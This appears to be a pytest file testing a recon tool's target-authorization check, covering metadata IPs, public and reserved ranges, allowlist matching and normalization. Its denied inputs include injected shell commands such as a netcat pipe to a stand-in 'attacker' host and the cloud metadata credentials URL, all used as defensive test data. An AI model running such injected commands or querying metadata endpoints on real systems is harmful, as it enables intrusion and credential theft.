"""ReconEngine target-authorization tests.

`validate_target` is the only thing standing between `/autorecon` and an
arbitrary host, so the boundary is worth pinning down precisely.

The original check used `ipaddress.ip_address(host).is_private`, which is much
wider than "local". `is_private` returns True for 169.254.0.0/16 - the cloud
instance metadata endpoint on AWS/GCP/Azure, where a GET returns the node's
IAM credentials - and for 0.0.0.0/8, which on Linux routes to localhost. Both
were reachable.

These tests are pure validation logic: no network, no DNS, no scanning.
"""
import pytest

from recon_engine import ReconEngine, SafetyError


@pytest.fixture
def engine():
    return ReconEngine()


@pytest.fixture
def approved(monkeypatch):
    monkeypatch.setenv("RAVEN_PRE_APPROVED_DOMAINS", "pentest.example, lab.internal")
    return ReconEngine()


# ── Must be allowed ────────────────────────────────────────────────────────
@pytest.mark.parametrize("target", [
    "127.0.0.1",
    "127.0.0.1:8080",
    "192.168.1.10",
    "10.0.0.5",
    "172.16.0.1",
    "172.31.255.254",
    "localhost",
    "[::1]",
    "[::1]:8080",
    "fe80::1",          # link-local, but a legitimate on-segment target
    "fc00::1",          # unique local
])
def test_local_targets_allowed(engine, target):
    assert engine.validate_target(target)


# ── Must be denied ─────────────────────────────────────────────────────────
@pytest.mark.parametrize("target", [
    # Cloud metadata. Reading this leaks the node's IAM role credentials.
    "169.254.169.254",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "169.254.169.253",
    "169.254.1.1",
    # "this host" on Linux, and reserved/broadcast space.
    "0.0.0.0",
    "255.255.255.255",
    "240.0.0.1",
    # Carrier NAT, IETF assignments, benchmarking, documentation ranges.
    "100.64.0.1",
    "192.0.0.1",
    "198.18.0.1",
    "203.0.113.5",
    # Public addresses.
    "8.8.8.8",
    "1.1.1.1",
    # Names must not slip past the IP check.
    "example.com",
    "metadata.google.internal",
    # Command injection attempts in the target string.
    "127.0.0.1; whoami",
    "127.0.0.1 && calc",
    "127.0.0.1 | nc attacker 4444",
    "$(id)",
    # Empty / junk.
    "",
    "   ",
    "not a host",
])
def test_remote_targets_denied(engine, target):
    with pytest.raises(SafetyError):
        engine.validate_target(target)


# ── Pre-approved domain allowlist ──────────────────────────────────────────
def test_allowlisted_domain_allowed(approved):
    assert approved.validate_target("pentest.example") == "pentest.example"


@pytest.mark.parametrize("target", [
    "evil.com",
    # No subdomain wildcard: the allowlist is exact-match, so a subdomain of an
    # allowed name must not inherit the authorization.
    "sub.pentest.example",
    # No suffix match either.
    "pentest.example.evil.com",
    "PENTEST.example.evil.com",
])
def test_non_allowlisted_denied(approved, target):
    with pytest.raises(SafetyError):
        approved.validate_target(target)


# ── Normalization ─────────────────────────────────────────────────────────
@pytest.mark.parametrize("target,expected", [
    ("http://127.0.0.1:8080/admin", "127.0.0.1"),
    ("https://192.168.0.1/login", "192.168.0.1"),
    ("127.0.0.1:9000", "127.0.0.1"),
    ("http://user:pass@127.0.0.1/x", "127.0.0.1"),
    ("  10.1.2.3  ", "10.1.2.3"),
    ("[::1]:443", "::1"),
])
def test_normalization_strips_port_scheme_and_creds(engine, target, expected):
    assert engine.validate_target(target) == expected


def test_port_is_stripped_without_eating_ipv6(engine):
    """A naive `host.split(":")[0]` turns "::1" into "" and rejects it.

    That silently made every IPv6-local target unusable, which is a plausible
    reason for someone to widen the check in the first place.
    """
    assert engine.validate_target("::1") == "::1"
    assert engine.validate_target("fe80::1") == "fe80::1"


def test_localhost_must_actually_resolve_to_loopback(monkeypatch, engine):
    """A poisoned hosts entry must not launder an off-box target.

    `localhost` is accepted by name, but only after every address it resolves
    to is confirmed loopback.
    """
    import socket

    monkeypatch.setattr(socket, "getaddrinfo",
                        lambda *a, **k: [(socket.AF_INET, 0, 0, "", ("8.8.8.8", 0))])
    with pytest.raises(SafetyError):
        engine.validate_target("localhost")